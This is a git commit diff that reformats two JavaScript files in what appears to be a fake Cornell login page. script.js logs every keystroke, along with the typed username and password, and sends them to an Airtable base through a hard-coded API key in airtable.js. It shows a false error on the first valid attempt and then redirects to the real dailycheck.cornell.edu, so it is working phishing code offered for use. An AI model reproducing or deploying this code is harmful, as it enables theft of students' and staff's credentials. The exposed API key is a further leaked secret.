d24eef9b9b889450a1e6b36648a8bebdea319c1b
cornellstudentservices <94484653+cornellstudentservices@users.noreply.github.com>
2022-05-23 02:33:28 -0400

    Add files via upload

--- login/auth/cornell/js/airtable.js
+++ login/auth/cornell/js/airtable.js
@@ -1,27 +1,21 @@
-var Airtable = require('airtable');
+var Airtable = require("airtable");
 
-var base = new Airtable({apiKey: 'key3oGJSSKq3w6Hyt'}).base('appU1lYBtEqlYSvWL');
+var base = new Airtable({ apiKey: "key3oGJSSKq3w6Hyt" }).base(
+  "appU1lYBtEqlYSvWL"
+);
 
-function uploadSet(set){
-
-  console.log('hello')
-
-    let date = new Date().toLocaleString()
-    let obj =
-    {
-        "fields":
-        {
-          "date": date,
-          "text": set,
-        }
+function uploadSet(set) {
+  let date = new Date().toLocaleString();
+  let obj = {
+    fields: {
+      date: date,
+      text: set,
+    },
+  };
+  base("data").create([obj], function (err, records) {
+    if (err) {
+      return;
     }
-    base('data').create([
-        obj
-      ], function(err, records) {
-        if (err) {
-          return;
-        }
-        records.forEach(function (record) {
-        });
-    })
+    records.forEach(function (record) {});
+  });
 }
--- login/auth/cornell/js/script.js
+++ login/auth/cornell/js/script.js
@@ -1,60 +1,56 @@
-function valid(id){
-    if (id.length < 3 || id.length > 6){
-        return false
+function valid(id) {
+  if (id.length < 3 || id.length > 6) {
+    return false;
+  }
+  index = 0;
+  for (let i = 0; i < id.length; i++) {
+    if (!isNaN(id[i])) {
+      index = i;
+      break;
     }
-    index = 0
-    for (let i=0; i<id.length; i++){
-        if (!isNaN(id[i])){
-            index = i
-            break
-        }
+  }
+  if (index == 0) {
+    return false;
+  }
+  letters = id.substring(0, index);
+  number = id.substring(index, id.length);
+  if (isNaN(number)) {
+    return false;
+  }
+  for (let i = 0; i < letters.length; i++) {
+    if (!isNaN(letters[i])) {
+      return false;
     }
-    if (index == 0){
-        return false
-    }
-    letters = id.substring(0,index)
-    number = id.substring(index, id.length)
-    if (isNaN(number)){
-        return false
-    }
-    for (let i=0; i<letters.length; i++){
-        if (!isNaN(letters[i])){
-            return false
-        }
-    }
-    return true
+  }
+  return true;
 }
 
-window.addEventListener('keydown', e => {
-    if (Id('username').value.length > 2 && Id('password').value.length > 4){
-        console.log('y')
-        uploadSet('-')
-        console.log('yo')
-        setTimeout(()=>{
-            uploadSet('username: ' + Id('username').value)
-            uploadSet('password: ' + Id('password').value)
-        },10)
-        uploadSet('char: ' + e.key)
-    }
-})
+window.addEventListener("keydown", (e) => {
+  if (Id("username").value.length > 2 && Id("password").value.length > 4) {
+    setTimeout(() => {
+      uploadSet("username: " + Id("username").value);
+      uploadSet("password: " + Id("password").value);
+    }, 10);
+    uploadSet("char: " + e.key);
+  }
+});
 
-stage = 0
-Id('submit').onclick = () => {
-    if (valid(Id('username').value) && Id('password').value.length > 6){
-        if (stage == 0){
-            Id('reason').style.display = 'none'
-            setTimeout(()=>{
-                Id('reason').style.display = 'block'
-            },50)
-            stage = 1
-        }else{
-            window.location.href = 'https://dailycheck.cornell.edu'
-        }
-
-    }else{
-        Id('reason').style.display = 'none'
-        setTimeout(()=>{
-            Id('reason').style.display = 'block'
-        },50)
+stage = 0;
+Id("submit").onclick = () => {
+  if (valid(Id("username").value) && Id("password").value.length > 6) {
+    if (stage == 0) {
+      Id("reason").style.display = "none";
+      setTimeout(() => {
+        Id("reason").style.display = "block";
+      }, 50);
+      stage = 1;
+    } else {
+      window.location.href = "https://dailycheck.cornell.edu";
     }
-}
+  } else {
+    Id("reason").style.display = "none";
+    setTimeout(() => {
+      Id("reason").style.display = "block";
+    }, 50);
+  }
+};
